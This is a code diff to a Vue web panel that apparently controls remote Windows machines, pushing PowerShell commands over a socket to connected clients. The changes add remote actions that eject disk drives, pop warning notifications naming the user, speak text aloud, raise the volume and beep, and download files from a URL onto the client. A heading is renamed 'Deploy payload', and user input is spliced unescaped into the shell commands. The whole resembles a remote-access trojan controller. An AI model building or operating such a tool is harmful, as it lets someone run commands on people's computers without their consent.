@@ -70,7 +70,7 @@
                 <i class="material-icons icon">{{ controlOptions.enabled && controlOptions.function ? 'chevron_right' : 'close' }}</i>
               </div>
               <div class = "userInformation">
-                <h3>Prepare transmission</h3>
+                <h3>Deploy payload</h3>
                 <h4>Is internal: <span>{{ (controlOptions.isInternal ? 'true' : 'false').toUpperCase() }}</span></h4>
               </div>
             </div>
@@ -131,6 +131,7 @@ export default {
     EventBus.$on("connectedClients", parsedData => {
       this.userData = parsedData;
     });
+    //[...this.$el.getElementsByTagName("textarea")].map(element => this.createCodebox(element))
 
     let vm = this;
 
@@ -228,6 +229,12 @@ export default {
     });
   },
   methods: {
+    createCodebox: function(codeElement){
+      return codemirror.fromTextArea(codeElement, {
+        lineNumbers: true,
+        theme: "monokai"
+      });
+    },
     realTimeAllocation: function() {
       this._data.socketData.CurrentSocket.on(
         "DisconnectionFromClient",
@@ -251,10 +258,12 @@ export default {
       if (requiresInput) {
         let inputContainer = eventElement.target.closest('.deviceCard').getElementsByTagName("div")[0].getElementsByClassName("inputContainer")[0]
         if (
-          inputContainer.getElementsByTagName("input").length > 1
+          inputContainer.getElementsByTagName("textarea").length > 1
         ) {
-          let primaryInput = inputContainer.getElementsByTagName("input")[0].value;
-          let secondaryInput = inputContainer.getElementsByTagName("input")[1].value;
+          let primaryInput = inputContainer.getElementsByTagName("textarea")[0].value;
+          let secondaryInput = inputContainer.getElementsByTagName("textarea")[1].value;
+
+          console.log(primaryInput, secondaryInput)
 
           if (primaryInput !== "" || secondaryInput !== "") {
             this._data.nessescaryFunctions.Store.setItem(
@@ -282,7 +291,7 @@ export default {
             });
           }
         } else {
-          let userInput = inputContainer.getElementsByTagName("input")[0].value;
+          let userInput = inputContainer.getElementsByTagName("textarea")[0].value;
           if (userInput !== "") {
             this._data.nessescaryFunctions.Store.setItem(
               identifier.functionName,
@@ -550,6 +559,24 @@ export default {
           }
         },
         {
+          functionName: "Open disk drive",
+          requiresInput: false,
+          enabled: true,
+          function(vm) {
+            let shellCommand = `$sh = New-Object -ComObject "Shell.Application"
+            $sh.Namespace(17).Items() |  Where-Object { $.Type -eq "CD Drive" } | foreach { $.InvokeVerb("Eject") }`;
+            return vm.socketData.CurrentSocket.emit("transmitToClients", {
+              auth: "B3GHU8",
+              computerName: vm.socketData.computerName,
+              functionName: this.functionName,
+              internalCall: {
+                isShell: true,
+                Data: shellCommand
+              }
+            })
+          }
+        },
+        {
           functionName: "Keyboard",
           requiresInput: false,
           enabled: true,
@@ -611,7 +638,7 @@ export default {
           enabled: false
         },
         {
-          functionName: "Min windows",
+          functionName: "Minimize windows",
           requiresInput: false,
           enabled: true,
           function(vm, PATH) {
@@ -626,14 +653,85 @@ export default {
                 isShell: true,
                 Data: shellCommand
               }
-            });
+            })
           }
         },
         {
           functionName: "Send notification",
           requiresInput: true,
           placeHolder: "Hello World",
-          enabled: false
+          enabled: true,
+          function(vm, CONTENT) {
+            let shellCommand = `Add-Type -AssemblyName System.Windows.Forms
+            $global:balloon = New-Object System.Windows.Forms.NotifyIcon
+            $path = (Get-Process -id $pid).Path
+            $balloon.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
+            $balloon.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Warning
+            $balloon.BalloonTipText = '${CONTENT}?'
+            $balloon.BalloonTipTitle = "Attention $Env:USERNAME"
+            $balloon.Visible = $true
+            $balloon.ShowBalloonTip(5000)`;
+            return vm.socketData.CurrentSocket.emit("transmitToClients", {
+              auth: "B3GHU8",
+              computerName: vm.socketData.computerName,
+              functionName: this.functionName,
+              internalCall: {
+                isShell: true,
+                Data: shellCommand
+              }
+            });
+          }
+        },
+        {
+          functionName: "Speech synthesis",
+          requiresInput: true,
+          placeHolder: "Hello World",
+          enabled: true,
+          function(vm, CONTENT) {
+            let shellCommand = `Add-Type -AssemblyName System.speech
+            $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
+            $speak.Speak("${CONTENT}")`;
+            return vm.socketData.CurrentSocket.emit("transmitToClients", {
+              auth: "B3GHU8",
+              computerName: vm.socketData.computerName,
+              functionName: this.functionName,
+              internalCall: {
+                isShell: true,
+                Data: shellCommand
+              }
+            });
+          }
+        },
+        {
+          functionName: "Play beeper",
+          requiresInput: true,
+          inputAmounts: 2,
+
+          placeHolderPrimary: "Pitch",
+          placeHolderSecondary: "Duration",
+
+          enabled: true,
+          function: function(vm, Pitch, Duration) {
+            let shellCommand = `
+            $obj = new-object -com wscript.shell
+            For ($i = 0; $i -lt 50; $i++){
+              $obj.SendKeys([char]175)
+              sleep 0.01
+            };
+
+            [console]::beep(${Pitch}, ${Duration})
+            `;
+
+            return vm.socketData.CurrentSocket.emit("transmitToClients", {
+              auth: "B3GHU8",
+              computerName: vm.socketData.computerName,
+              functionName: this.functionName,
+              internalCall: {
+                isShell: true,
+                Data: shellCommand
+              }
+            });
+          }
         },
         {
           functionName: "Download file",
@@ -645,7 +743,6 @@ export default {
 
           enabled: true,
           function: function(vm, URL, PATH) {
-            console.log(vm, URL, PATH);
             let shellCommand = `
             $url = "${URL}"
             $output = "${PATH}"
